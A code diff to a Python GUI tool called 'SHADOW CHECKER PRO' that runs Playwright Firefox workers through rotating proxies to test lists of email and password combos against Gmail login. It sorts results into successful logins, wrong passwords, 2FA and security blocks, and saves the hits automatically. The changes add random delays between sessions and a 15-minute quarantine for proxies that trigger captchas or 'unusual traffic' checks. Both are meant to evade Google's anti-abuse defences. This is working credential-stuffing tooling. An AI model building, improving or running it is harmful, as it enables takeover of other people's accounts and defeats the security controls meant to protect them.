@@ -1,5 +1,5 @@
 """
-SHADOW CHECKER PRO — Full Architecture, LiveViewer, Dynamic Identity & Classified Auto-Save
+SHADOW CHECKER PRO — Firefox Private Contexts, Staggered Jitter, Proxy Quarantine & Classified Auto-Save
 """
 
 import sys
@@ -36,7 +36,6 @@ from integrations.proxy_runtime import ProxyRuntime
 from integrations.proxy_pool import ProxyPool
 from integrations.proxy_only_gui import ProxyOnlyWindow
 from integrations.worker_liveviewer import LiveViewerBridge
-from integrations.browser_identity import BrowserIdentityManager
 
 
 TARGET_URL = "https://www.gmail.com"
@@ -219,7 +218,7 @@ class FirefoxWorker(QThread):
     log_signal = Signal(str)
 
     def __init__(self, browser_id, proxy, protocol, expected_ip,
-                 lease=None, direct=False, combo_queue=None, identity_manager=None):
+                 lease=None, direct=False, combo_queue=None):
         super().__init__()
         self.browser_id = browser_id
         self.proxy = proxy
@@ -228,9 +227,9 @@ class FirefoxWorker(QThread):
         self.lease = lease
         self.direct = direct
         self.combo_queue = combo_queue
-        self.identity_manager = identity_manager
         self.stop_event = threading.Event()
         self.current_bridge = None
+        self.needs_quarantine = False  # علامة لتحديد ما إذا كان البروكسي يحتاج حجر صحي
 
     def show_viewer(self):
         if self.current_bridge:
@@ -253,10 +252,15 @@ class FirefoxWorker(QThread):
                 except queue.Empty:
                     continue
 
+                # 3. الديكالاج العشوائي (Staggered Jitter Delay) بين انطلاق الجلسات لتفادي الزحام
+                jitter = random.uniform(5.0, 15.0)
+                self.log_signal.emit(f"[{label}] Staggered Jitter: waiting {jitter:.1f}s before starting session...")
+                time.sleep(jitter)
+
                 email, password = combo
                 masked_email = email[:3] + "***" if len(email) > 3 else "***"
                 self.status_signal.emit(self.browser_id, f"CHECKING {masked_email}", proxy_label)
-                self.log_signal.emit(f"[{label}] Opening fresh isolated session with dynamic identity for: {masked_email}")
+                self.log_signal.emit(f"[{label}] Opening fresh isolated Firefox Private Context for: {masked_email}")
 
                 status = "UNKNOWN"
                 detail = "Initialized"
@@ -275,16 +279,13 @@ class FirefoxWorker(QThread):
                     browser = playwright.firefox.launch(**options)
                     context = None
                     try:
-                        if self.identity_manager:
-                            identity_config = self.identity_manager.request_config(self.browser_id)
-                            context_opts = identity_config.playwright_options()
-                        else:
-                            context_opts = {
-                                "viewport": FIREFOX_VIEWPORT,
-                                "accept_downloads": False,
-                                "permissions": [],
-                                "ignore_https_errors": False,
-                            }
+                        # الاعتماد الحصري على Firefox Private Context نظيفة ومعزولة
+                        context_opts = {
+                            "viewport": FIREFOX_VIEWPORT,
+                            "accept_downloads": False,
+                            "permissions": [],
+                            "ignore_https_errors": False,
+                        }
 
                         context = browser.new_context(**context_opts)
                         context.add_init_script(script=PERSISTENT_ZOOM_SCRIPT)
@@ -320,6 +321,7 @@ class FirefoxWorker(QThread):
                         elif any(w in body_text for w in ["captcha", "unusual traffic", "verify that it's you"]):
                             status = "SECURITY BLOCK"
                             detail = "Captcha / Unusual Traffic detected on email stage"
+                            self.needs_quarantine = True  # إرسال البروكسي للحجر الصحي
                         else:
                             pwd_input_sel = 'input[type="password"], input[name="Passwd"]'
                             try:
@@ -368,6 +370,7 @@ class FirefoxWorker(QThread):
                                 elif any(w in pwd_body for w in ["captcha", "unusual traffic"]):
                                     status = "SECURITY BLOCK"
                                     detail = "Security check / Captcha on password stage"
+                                    self.needs_quarantine = True  # إرسال البروكسي للحجر الصحي
                                 elif any(w in pwd_url for w in ["myaccount.google.com", "mail.google.com", "landing", "signinoptions"]):
                                     status = "LOGIN OK"
                                     detail = "Successfully authenticated and reached inbox/dashboard"
@@ -377,6 +380,7 @@ class FirefoxWorker(QThread):
                             except Exception as pwd_exc:
                                 status = "SECURITY BLOCK"
                                 detail = f"Password stage timeout/security wall: {type(pwd_exc).__name__}"
+                                self.needs_quarantine = True
 
                     except Exception as exc:
                         status = "ERROR"
@@ -426,7 +430,7 @@ class CheckerWindow(QMainWindow):
         super().__init__()
 
         self.setWindowTitle(
-            "SHADOW CHECKER PRO — Classified Auto-Save Integration"
+            "SHADOW CHECKER PRO — Firefox Private & Proxy Quarantine"
         )
 
         self.resize(920, 610)
@@ -446,14 +450,12 @@ class CheckerWindow(QMainWindow):
 
         self.proxy_pool = ProxyPool()
         self.combo_queue = queue.Queue()
-        
-        self.identity_manager = BrowserIdentityManager()
 
         self.browser_status = []
         self.browser_show_buttons = []
         self.last_export_path = None
         self._export_session_token = None
-        self._export_paths = {}  # لتخزين مسارات المجلدات الثلاثة المحدثة
+        self._export_paths = {}
 
         self.loaded_count = 0
         self.checked_count = 0
@@ -469,7 +471,7 @@ class CheckerWindow(QMainWindow):
         self.build_ui()
         self.diagnostic("system", "startup", python=sys.version.split()[0],
                         os=platform.platform(), target=TARGET_URL)
-        self.log("Proxy Runtime & Dynamic Identity Manager ready at startup.")
+        self.log("Proxy Runtime & Firefox Private Context Manager ready at startup.")
 
     def panel(self, layout=None):
         panel = QFrame(objectName="panel")
@@ -1073,8 +1075,7 @@ class CheckerWindow(QMainWindow):
                 lease = None
                 worker = FirefoxWorker(
                     browser_id, None, "DIRECT",
-                    "Not verified", direct=True, combo_queue=self.combo_queue,
-                    identity_manager=self.identity_manager
+                    "Not verified", direct=True, combo_queue=self.combo_queue
                 )
             else:
                 lease = self.proxy_pool.acquire(f"browser-{browser_id}", timeout=0)
@@ -1082,8 +1083,7 @@ class CheckerWindow(QMainWindow):
                     continue
                 worker = FirefoxWorker(
                     browser_id, lease.proxy, lease.protocol,
-                    lease.exit_ip, lease=lease, combo_queue=self.combo_queue,
-                    identity_manager=self.identity_manager
+                    lease.exit_ip, lease=lease, combo_queue=self.combo_queue
                 )
             worker.status_signal.connect(self.update_browser_status)
             worker.result_signal.connect(self.handle_result)
@@ -1118,8 +1118,6 @@ class CheckerWindow(QMainWindow):
             self.table.setItem(row, column, QTableWidgetItem(str(value)))
 
         self.refresh_stats()
-        
-        # حفظ تلقائي مقسم حسب المجلدات الثلاثة الجديدة
         self.last_export_path = self.auto_save_classified_result(record)
 
     def auto_save_classified_result(self, record):
@@ -1131,10 +1129,8 @@ class CheckerWindow(QMainWindow):
                 base = Path(__file__).resolve().parent.parent
 
             parent_dir = base / "output" / "Shadow_Checker"
-            
             status = record[2]
             
-            # تحديد المجلد والتصنيف بناءً على الحالة
             failed_statuses = ["PASSWORD WRONG", "ACCOUNT NOT FOUND", "PASSWORD CHANGED", "ACCOUNT DISABLED"]
             successful_statuses = ["LOGIN OK", "PHONE VERIFIED", "NEW ACCOUNT WELCOME", "PASSWORD REQUIRE CHANGE"]
             security_statuses = ["2FA", "SECURITY BLOCK", "ERROR"]
@@ -1217,7 +1213,13 @@ class CheckerWindow(QMainWindow):
 
     def worker_finished(self, worker):
         if worker.lease is not None:
-            self.proxy_pool.release(worker.lease)
+            # التحقق مما إذا كان البروكسي واجه كابتشا أو حظر أمني -> إدخاله في الحجر الصحي (15 دقيقة = 900 ثانية)
+            if getattr(worker, "needs_quarantine", False):
+                self.proxy_pool.quarantine(worker.lease, 900)
+                self.log(f"[PROXY COOLDOWN] Proxy {worker.proxy.label} placed in quarantine for 15 minutes due to Security Block.")
+            else:
+                self.proxy_pool.release(worker.lease)
+
         if worker in self.workers:
             self.workers.remove(worker)
 
